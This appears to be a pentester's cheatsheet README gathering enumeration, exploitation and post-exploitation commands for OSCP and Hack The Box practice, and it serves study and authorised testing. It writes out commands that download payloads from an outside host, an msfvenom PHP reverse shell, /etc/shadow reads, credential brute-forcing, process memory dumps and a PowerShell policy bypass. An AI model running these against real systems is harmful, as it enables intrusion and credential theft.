# Hacking-Cheatsheet
In this repo I collect all commands, links, techniques and tricks I found during my work as pentester, hacker, OSCP student and hack the box fan.

# Basic Linux stuff you may need
Keyword search in man pages:
```bash
man -k <KEYWORD>
```
Alternatively:
```bash
apropos <KEYWORD>
```


# External Enumeration

## OSINT
### Crawl words from website for passwordlist
```bash
cewl <domain> -m 6 -w words.txt
```

## Port-Scanning
Scan all ports with service detection
```bash
nmap -v -A -p- <Target-IP>
```

## Webserver Enumeration
### Vhost Enumeration
```
nmap --script=http-vhosts --script-args domain=<DOMAIN> -p80,443 -v <Target/DOMAIN>
```

## SMB-Enumeration

### Enum4Linux
```bash
enum4linux -a <IP>
```

### rpcclient
```bash
rpcclient -U "" <Target IP>
```
enter empty password

Commands in rpcclient console:
- srvinfo: Identify OS Versions
- enumdomusers: List of Usernames on this server
- getdompwinfo: Displays SMB password policy

### CrackMapExec
List of Users and Passwords to try:
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
```

Login to WinRM (Alternative to evil-winrm):
```bash
crackmapexec winrm <IP> -u <USER> -p <PASSWORD>
```
Hint: User needs to be in group "Remote Management Users"

Brute Usernames through RID
```bash
crackmapexec smb <IP> -u <USER> -p <PASSWORD> --rid-brute
```


## SMTP-Enumeration
SMTP-Enumeration with netcat
```bash
for user in $(cat typical_usernames_SMTP_Enumeration.txt); do echo VRFY $user |nc -nv -w 1 <Target-IP> 25 2>/dev/null |grep ^"250";done
```

## SNMP-Enumeration

Enumerate set of IPs for different SNMP communities
```bash
onesixtyone -c community_names.txt -i ips.txt
```
examples for community names:
- public


Get list of running programs
```bash
snmpwalk -c public -v1 <Target-IP> 1.3.6.1.2.1.25.4.2.1.2
```

Get list of open ports
```bash
snmpwalk -c public -v1 <Target-IP> 1.3.6.1.2.1.6.13.1.3
```

Get list of installed software
```bash
snmpwalk -c public -v1 <Target-IP> 1.3.6.1.2.1.25.6.3.1.2
```

## Wordpress Enumeration
```bash
wpscan --update
wpscan --url <TARGET-URL>
```



# File Transfer and File Downloads

## Windows
### Download files with certutil
```bash
certutil.exe -urlcache -f http://<ip>:<port>/<filename> <localfilename>
```
Example:
```bash
certutil.exe -urlcache -f http://10.10.14.37:8080/shell.exe reverse_shell.exe
```

### Downlaod files with Powershell
```cmd
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://192.168.30.5/exploit.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url, $file) >>wget.ps1
```

Execute File with: [Execute Powershell File, bypass all policies](#execute-powershell-file-bypass-all-policies)

## Python Webserver
Create webserver listening to port 8080 offering files from current working directory
```bash
python3 -m http.server 8080
```
# Exploiting

## SQL Injections

### Detect number of columns for UNION attack:
add a 
```SQL
ORDER BY 1--
```
statement to sql command.
Than increase number after ORDER BY until you receive a error => Value before is the correct number of columns for UNION statement.

## Wordpress Exploiting
When you have valid admin credentials for Wordpress installation use following script to generate malicious plugin and uploading the generated plugin to WP.
[https://github.com/wetw0rk/malicious-wordpress-plugin/blob/master/wordpwn.py](https://github.com/wetw0rk/malicious-wordpress-plugin/blob/master/wordpwn.py)

## Creating Exploits with msfvenom
### Web Payloads

#### PHP Meterpreter
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
```
Don't forget to remove the starting chars of the generated file.

## Buffer Overflows

### Create unique pattern
Create a unique pattern to identify correct position for buffer overflow
```bash
/usr/share/metasploit-framework/tools/pattern_create.rb <# bytes>
```

# Local Enumeration

## Local Linux Enumeration

### System information/version
Show information about kernel and linux system
```bash
uname -a
```

Show linux version
```bash
cat /etc/issue
```

### Find local users
```bash
cat /etc/passwd
```

### Password hashes
```bash
cat /etc/shadow
```

### Find world writable files
```bash
find / -perm -2 ! -type l -ls 2>/dev/null
```

## Local Windows Enumeration

### Open Ports local
```cmd
netstat -an
```

### Check permission of executable
```bash
icacls <filename>
```

# Exploitation

## SSH Exploitation
Try given Username + Password combinations on SSH with nmap
```bash
nmap -p 22 --script ssh-brute --script-args userdb=userdb.lst,passdb=passdb.lst <IP>
```

## Local Windows Exploitation

### Service Exploitation
Dump full memory from service with Procdump
```cmd
.\procdump.exe -ma <PROCESS ID> <Filename>
```


# Post Exploitation
## Linux Post Exploitation
### Create tty console with python
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```
```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

### Cracking encrypted zip-file
```bash
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' <zip-file-name>
```

## Windows Post Exploitation
### Execute Powershell file, bypass all policies
```cmd
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1
```

### RDP connection from Linux host to Windows target
```cmd
rdesktop -u <User> -p <Password> <Target-IP>
```
## Crypto-Fun
Attacking Weak RSA Keys:
[https://github.com/Ganapati/RsaCtfTool](https://github.com/Ganapati/RsaCtfTool)
```bash
python3 RsaCtfTool.py --publickey <PUBLIC KEY> --uncipherfile <CIPHERED FILE>
```
